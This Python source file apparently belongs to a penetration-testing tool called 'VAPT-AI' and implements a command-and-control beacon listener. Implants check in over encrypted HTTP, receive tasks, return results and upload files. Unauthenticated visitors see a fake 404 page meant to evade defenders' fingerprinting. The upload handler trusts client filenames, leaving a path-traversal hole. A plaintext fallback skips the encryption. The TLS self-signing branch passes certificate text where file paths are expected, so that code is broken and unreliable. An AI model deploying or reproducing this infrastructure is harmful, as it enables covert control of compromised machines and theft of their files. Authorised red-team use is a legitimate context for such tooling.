"""
VAPT-AI C2 HTTP Beacon Listener (W14-S5).

Python port of CyberStrikeAI internal/c2/listener_http.go using aiohttp.

Endpoints (port from CyberStrikeAI, default paths overridable via ListenerConfig):
    POST /checkin   — beacon check-in (encrypted body)
    GET  /tasks     — beacon polls pending tasks (encrypted response)
    POST /result    — beacon submits task result (encrypted body)
    POST /upload    — file upload (multipart)
    GET  /file/{id} — file download (encrypted metadata)

All requests require `Authorization: Bearer <implant_token>` header.
Unauthenticated requests receive `404 Not Found` (disguisedReject —
prevents blue-team fingerprinting).

Encrypted body format: base64(nonce[12] || ciphertext+tag[N+16])
decrypted using AES-256-GCM with the listener's pre-shared key.

Reference: CyberStrikeAI internal/c2/listener_http.go (Apache 2.0).
"""
from __future__ import annotations

import asyncio
import json
import logging
import os
import uuid
from datetime import datetime, UTC
from typing import Any

from aiohttp import web, ClientError

from app.c2.types import (
    ListenerType, ImplantCheckInRequest, ImplantCheckInResponse,
    TaskResultRequest, ListenerConfig,
)
from app.c2.crypto import decrypt_aes_gcm, encrypt_aes_gcm, CryptoError
from app.c2.manager import C2Manager, InvalidInputError, SessionNotFoundError

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# HTTP Beacon Listener
# ---------------------------------------------------------------------------

class HTTPBeaconListener:
    """HTTP/HTTPS Beacon listener (port from CyberStrikeAI listener_http.go).

    Spawns an aiohttp.web server on the configured bind_host:bind_port.
    Routes beacon traffic to the C2Manager for session/task management.

    Lifecycle:
        listener = HTTPBeaconListener(manager, config, key, token, scan_id)
        await listener.start()
        ...
        await listener.stop()
    """

    def __init__(
        self,
        manager: C2Manager,
        config: ListenerConfig,
        encryption_key_b64: str,
        implant_token_b64: str,
        listener_id: str,
        bind_host: str = "127.0.0.1",
        bind_port: int = 8443,
        use_tls: bool = False,
        tls_cert_path: str | None = None,
        tls_key_path: str | None = None,
    ):
        self.manager = manager
        self.config = config
        self.config.apply_defaults()
        self.encryption_key_b64 = encryption_key_b64
        self.implant_token_b64 = implant_token_b64
        self.listener_id = listener_id
        self.bind_host = bind_host
        self.bind_port = bind_port
        self.use_tls = use_tls
        self.tls_cert_path = tls_cert_path
        self.tls_key_path = tls_key_path

        self._runner: web.AppRunner | None = None
        self._site: web.TCPSite | None = None
        self._stopped = False
        self._lock = asyncio.Lock()

    # ---------- Listener type ----------

    @property
    def type(self) -> str:
        return ListenerType.HTTPS_BEACON.value if self.use_tls else ListenerType.HTTP_BEACON.value

    # ---------- Lifecycle ----------

    async def start(self) -> None:
        """Start the HTTP server (async, non-blocking)."""
        app = web.Application(
            client_max_size=1024 * 1024 * 16,  # 16 MB upload limit
        )

        # Register routes — paths come from ListenerConfig (defaults to /checkin, /tasks, etc.)
        app.router.add_post(self.config.beacon_check_in_path, self._handle_checkin)
        app.router.add_get(self.config.beacon_tasks_path, self._handle_tasks)
        app.router.add_post(self.config.beacon_result_path, self._handle_result)
        app.router.add_post(self.config.beacon_upload_path, self._handle_upload)
        app.router.add_get(self.config.beacon_file_path + "{file_id}", self._handle_file_serve)

        # Disguise fallback: any other path → 404 (looks like ordinary web server)
        app.router.add_route("*", "/{tail:.*}", self._disguised_reject)

        self._runner = web.AppRunner(app)
        await self._runner.setup()

        self._site = web.TCPSite(
            self._runner,
            self.bind_host,
            self.bind_port,
            ssl_context=self._build_ssl_context() if self.use_tls else None,
        )
        await self._site.start()

        await self.manager.register_running_listener(self.listener_id, self)

        logger.info(
            "C2 HTTP listener started: id=%s bind=%s:%d tls=%s paths={checkin=%s tasks=%s result=%s}",
            self.listener_id, self.bind_host, self.bind_port, self.use_tls,
            self.config.beacon_check_in_path, self.config.beacon_tasks_path,
            self.config.beacon_result_path,
        )

    async def stop(self) -> None:
        """Gracefully stop the listener."""
        async with self._lock:
            if self._stopped:
                return
            self._stopped = True

        if self._site is not None:
            await self._site.stop()
        if self._runner is not None:
            await self._runner.cleanup()

        await self.manager.unregister_running_listener(self.listener_id)
        logger.info("C2 HTTP listener stopped: id=%s", self.listener_id)

    def _build_ssl_context(self):
        """Build an SSLContext for HTTPS listener.

        If tls_cert_path + tls_key_path are provided, use them.
        Otherwise (if tls_auto_self_sign=True), generate a self-signed cert
        in-memory. This is acceptable for C2 beacons (which pin the cert
        fingerprint anyway).
        """
        import ssl
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import ec
        from datetime import timedelta

        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)

        if self.tls_cert_path and os.path.exists(self.tls_cert_path) \
                and self.tls_key_path and os.path.exists(self.tls_key_path):
            ctx.load_cert_chain(self.tls_cert_path, self.tls_key_path)
            return ctx

        if not self.config.tls_auto_self_sign:
            raise RuntimeError(
                "TLS requested but no cert provided and tls_auto_self_sign=False"
            )

        # Generate self-signed ECDSA cert (P-256, valid 1 year)
        key = ec.generate_private_key(ec.SECP256R1())
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "VAPT-AI"),
        ])
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.now(UTC))
            .not_valid_after(datetime.now(UTC) + timedelta(days=365))
            .add_extension(
                x509.SubjectAlternativeName([x509.DNSName("localhost")]),
                critical=False,
            )
            .sign(key, hashes.SHA256())
        )
        cert_pem = cert.public_bytes(serialization.Encoding.PEM)
        key_pem = key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        )
        ctx.load_cert_chain(cert_pem.decode("ascii"), key_pem.decode("ascii"))
        return ctx

    # ---------- Auth ----------

    def _check_implant_token(self, request: web.Request) -> bool:
        """Validate the beacon's Authorization: Bearer <token> header.

        Constant-time comparison to prevent timing attacks.
        """
        auth = request.headers.get("Authorization", "")
        if not auth.startswith("Bearer "):
            return False
        token = auth[7:].strip()
        # Constant-time comparison
        import hmac
        return hmac.compare_digest(token, self.implant_token_b64)

    async def _disguised_reject(self, request: web.Request) -> web.Response:
        """Return 404 for unauthenticated requests (looks like ordinary web server).

        Port from CyberStrikeAI disguisedReject().
        """
        return web.Response(
            status=404,
            text="<html><body><h1>Not Found</h1></body></html>",
            content_type="text/html",
        )

    # ---------- Encrypted I/O ----------

    async def _read_encrypted_body(self, request: web.Request) -> bytes | None:
        """Read + decrypt request body.

        Tries AES-GCM decrypt first. If that fails, tries plain JSON (for
        lightweight curl-oneliner testing).

        Returns:
            Plaintext bytes, or None if both decrypt + JSON parse failed.
        """
        body = await request.read()
        if not body:
            return None

        # Try AES-GCM decrypt (full beacon protocol)
        try:
            return decrypt_aes_gcm(self.encryption_key_b64, body.decode("ascii"))
        except (CryptoError, UnicodeDecodeError):
            pass

        # Fallback: assume plaintext JSON (curl-oneliner mode)
        return body

    def _write_encrypted(self, payload: Any) -> str:
        """Encrypt a response payload (dict → JSON → AES-GCM → base64)."""
        plaintext = json.dumps(payload).encode("utf-8")
        return encrypt_aes_gcm(self.encryption_key_b64, plaintext)

    # ---------- Handlers ----------

    async def _handle_checkin(self, request: web.Request) -> web.Response:
        """POST /checkin — beacon check-in.

        Body: AES-GCM encrypted JSON of ImplantCheckInRequest.
        Response: AES-GCM encrypted JSON of ImplantCheckInResponse.
        """
        if not self._check_implant_token(request):
            return await self._disguised_reject(request)

        plaintext = await self._read_encrypted_body(request)
        if plaintext is None:
            return await self._disguised_reject(request)

        try:
            req_data = json.loads(plaintext)
            req = ImplantCheckInRequest.from_dict(req_data)
        except (json.JSONDecodeError, KeyError) as e:
            logger.warning("Checkin parse failed: %s", e)
            return await self._disguised_reject(request)

        # Populate User-Agent + remote IP if beacon didn't send them
        if not req.user_agent:
            req.user_agent = request.headers.get("User-Agent", "")
        if not req.internal_ip:
            req.internal_ip = request.remote or "unknown"

        # Defaults from ListenerConfig if beacon didn't specify
        if req.sleep_seconds <= 0:
            req.sleep_seconds = self.config.default_sleep
        if req.jitter_percent < 0:
            req.jitter_percent = 0

        # Persist via manager
        try:
            session = await self.manager.ingest_checkin(
                listener_id=self.listener_id,
                listener_type=self.type,
                req=req,
                encryption_key_b64=self.encryption_key_b64,
                implant_token_b64=self.implant_token_b64,
            )
        except InvalidInputError as e:
            logger.warning("Checkin invalid: %s", e)
            return await self._disguised_reject(request)

        # Check for pending tasks
        pending = await self.manager.pop_tasks_for_beacon(str(session.id), limit=1)
        has_tasks = len(pending) > 0

        response = ImplantCheckInResponse(
            session_id=str(session.id),
            next_sleep=req.sleep_seconds or self.config.default_sleep,
            next_jitter=req.jitter_percent,
            has_tasks=has_tasks,
            server_time=int(datetime.now(UTC).timestamp()),
        )

        encrypted = self._write_encrypted(response.to_dict())
        return web.Response(text=encrypted, content_type="text/plain")

    async def _handle_tasks(self, request: web.Request) -> web.Response:
        """GET /tasks?session_id=<uuid> — beacon polls for pending tasks.

        Returns AES-GCM encrypted JSON: {tasks: [{task_id, type, payload}]}
        """
        if not self._check_implant_token(request):
            return await self._disguised_reject(request)

        session_id = request.query.get("session_id")
        if not session_id:
            return await self._disguised_reject(request)

        # Pop pending tasks for this session
        tasks = await self.manager.pop_tasks_for_beacon(session_id, limit=10)

        task_envelopes = [
            {
                "task_id": str(t.id),
                "type": t.command,
                "payload": t.args_json or {},
                "level": t.level,
            }
            for t in tasks
        ]

        encrypted = self._write_encrypted({"tasks": task_envelopes})
        return web.Response(text=encrypted, content_type="text/plain")

    async def _handle_result(self, request: web.Request) -> web.Response:
        """POST /result — beacon submits task result.

        Body: AES-GCM encrypted JSON of TaskResultRequest.
        Response: empty 200.
        """
        if not self._check_implant_token(request):
            return await self._disguised_reject(request)

        plaintext = await self._read_encrypted_body(request)
        if plaintext is None:
            return await self._disguised_reject(request)

        try:
            data = json.loads(plaintext)
            result = TaskResultRequest.from_dict(data)
        except (json.JSONDecodeError, KeyError) as e:
            logger.warning("Result parse failed: %s", e)
            return await self._disguised_reject(request)

        try:
            await self.manager.submit_task_result(result.task_id, result)
        except Exception as e:
            logger.warning("Task result submit failed: %s", e)
            return web.Response(status=500, text="submit failed")

        return web.Response(status=200, text="ok")

    async def _handle_upload(self, request: web.Request) -> web.Response:
        """POST /upload — file upload (multipart).

        Stores file in /tmp/vapt-ai-c2-uploads/<scan_id>/<task_id>/<filename>.
        Returns 200 OK with file metadata.
        """
        if not self._check_implant_token(request):
            return await self._disguised_reject(request)

        reader = await request.multipart()
        file_info = await reader.next()
        if file_info is None:
            return web.Response(status=400, text="no file")

        upload_dir = os.path.join(
            "/tmp", "vapt-ai-c2-uploads",
            self.manager.scan_id, str(uuid.uuid4()),
        )
        os.makedirs(upload_dir, exist_ok=True)
        file_path = os.path.join(upload_dir, file_info.filename)

        size = 0
        with open(file_path, "wb") as f:
            while True:
                chunk = await file_info.read_chunk(64 * 1024)
                if not chunk:
                    break
                f.write(chunk)
                size += len(chunk)

        logger.info("C2 upload: %s (%d bytes)", file_path, size)
        return web.json_response({
            "status": "ok",
            "path": file_path,
            "size": size,
        })

    async def _handle_file_serve(self, request: web.Request) -> web.Response:
        """GET /file/{file_id} — file download.

        Returns 404 for unknown file_id (not yet implemented in W14 — W15
        will add file management).
        """
        if not self._check_implant_token(request):
            return await self._disguised_reject(request)
        return web.Response(status=404, text="not found")


# ---------------------------------------------------------------------------
# Convenience: start listener as a background asyncio task
# ---------------------------------------------------------------------------

async def start_http_listener(
    manager: C2Manager,
    bind_host: str = "127.0.0.1",
    bind_port: int = 8443,
    use_tls: bool = False,
    config: ListenerConfig | None = None,
    listener_name: str = "http_listener",
) -> tuple[HTTPBeaconListener, dict[str, Any]]:
    """Create + start an HTTP beacon listener.

    Returns (listener_instance, listener_metadata) where metadata contains
    listener_id, encryption_key_b64, implant_token_b64, bind info.

    Usage:
        listener, meta = await start_http_listener(manager, bind_port=8443)
        # ... beacon checks in ...
        await listener.stop()
    """
    config = config or ListenerConfig()
    config.apply_defaults()

    # Use the manager to generate listener metadata (key + token)
    inp_meta = await manager.create_listener(
        inp=__import__("app.c2.manager", fromlist=["CreateListenerInput"]).CreateListenerInput(
            name=listener_name,
            scan_id=manager.scan_id,
            listener_type=ListenerType.HTTPS_BEACON.value if use_tls else ListenerType.HTTP_BEACON.value,
            bind_host=bind_host,
            bind_port=bind_port,
            config=config,
        )
    )

    listener = HTTPBeaconListener(
        manager=manager,
        config=config,
        encryption_key_b64=inp_meta["encryption_key_b64"],
        implant_token_b64=inp_meta["implant_token_b64"],
        listener_id=inp_meta["listener_id"],
        bind_host=inp_meta["bind_host"],
        bind_port=inp_meta["bind_port"],
        use_tls=use_tls,
        tls_cert_path=config.tls_cert_path,
        tls_key_path=config.tls_key_path,
    )

    await listener.start()
    return listener, inp_meta